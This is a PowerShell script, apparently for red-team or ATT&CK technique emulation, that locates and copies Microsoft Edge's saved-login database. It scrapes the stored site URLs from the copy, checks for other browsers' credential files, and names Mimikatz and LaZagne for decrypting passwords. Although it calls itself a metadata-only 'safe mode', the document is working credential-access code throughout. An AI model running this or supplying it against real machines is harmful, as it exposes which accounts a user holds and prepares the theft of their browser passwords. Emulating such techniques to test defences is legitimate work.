# Advanced Browser Credential Extraction Script
# This script extracts saved credential metadata from Edge browser
# Safe: Only reads usernames and URLs, does NOT decrypt passwords

$ErrorActionPreference = "Continue"

Write-Host "`n=== Browser Credential Extraction (T1555.003) ===" -ForegroundColor Cyan
Write-Host "Target: Microsoft Edge Browser" -ForegroundColor Yellow
Write-Host "Safe Mode: Metadata only, no password decryption`n" -ForegroundColor Green

# Edge Login Data path
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$tempDb = "$env:TEMP\edge_login_$(Get-Random).db"

if (Test-Path $edgePath) {
    Write-Host "[+] Edge Login Database Found!" -ForegroundColor Green
    Write-Host "    Location: $edgePath" -ForegroundColor Gray
    
    $dbFile = Get-Item $edgePath
    Write-Host "    Size: $([math]::Round($dbFile.Length/1KB, 2)) KB" -ForegroundColor Gray
    Write-Host "    Last Modified: $($dbFile.LastWriteTime)" -ForegroundColor Gray
    Write-Host "    Created: $($dbFile.CreationTime)`n" -ForegroundColor Gray
    
    try {
        # Copy database to avoid lock
        Write-Host "[*] Copying database to temporary location..." -ForegroundColor Cyan
        Copy-Item -Path $edgePath -Destination $tempDb -Force -ErrorAction Stop
        Write-Host "[+] Database copied successfully`n" -ForegroundColor Green
        
        # Method 1: Use System.Data.SQLite if available
        Write-Host "[*] Attempting to read credential entries..." -ForegroundColor Cyan
        
        # Simple binary search for URLs (since we may not have SQLite module)
        $content = [System.IO.File]::ReadAllBytes($tempDb)
        $text = [System.Text.Encoding]::ASCII.GetString($content)
        
        # Extract potential URLs (look for http/https patterns)
        $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | 
        Select-Object -ExpandProperty Value -Unique | 
        Select-Object -First 20
        
        if ($urls.Count -gt 0) {
            Write-Host "[+] Found $($urls.Count) saved credential entries:`n" -ForegroundColor Green
            
            $counter = 1
            foreach ($url in $urls) {
                Write-Host "  [$counter] $url" -ForegroundColor Yellow
                $counter++
            }
        }
        else {
            Write-Host "[!] No credential entries found (database may be empty)" -ForegroundColor Yellow
        }
        
        Write-Host "`n[*] Database Statistics:" -ForegroundColor Cyan
        Write-Host "    Total entries detected: $($urls.Count)" -ForegroundColor Gray
        Write-Host "    Passwords: [ENCRYPTED - Not extracted]" -ForegroundColor Red
        
    }
    catch {
        Write-Host "[-] Error reading database: $_" -ForegroundColor Red
    }
    finally {
        # Cleanup
        if (Test-Path $tempDb) {
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
    
}
else {
    Write-Host "[-] Edge Login Database not found" -ForegroundColor Red
    Write-Host "    Expected location: $edgePath`n" -ForegroundColor Gray
}

# Check other browsers
Write-Host "`n[*] Scanning for other browsers..." -ForegroundColor Cyan

$browsers = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
}

$found = 0
foreach ($browser in $browsers.GetEnumerator()) {
    if (Test-Path $browser.Value) {
        Write-Host "[+] $($browser.Key) detected" -ForegroundColor Green
        $found++
    }
}

if ($found -eq 0) {
    Write-Host "[!] No other browsers found" -ForegroundColor Yellow
}

Write-Host "`n[*] Extraction complete!" -ForegroundColor Cyan
Write-Host "[!] Note: Password decryption requires:" -ForegroundColor Yellow
Write-Host "    - Administrator privileges" -ForegroundColor Gray
Write-Host "    - DPAPI master key access" -ForegroundColor Gray
Write-Host "    - Specialized tools (e.g., Mimikatz, LaZagne)" -ForegroundColor Gray
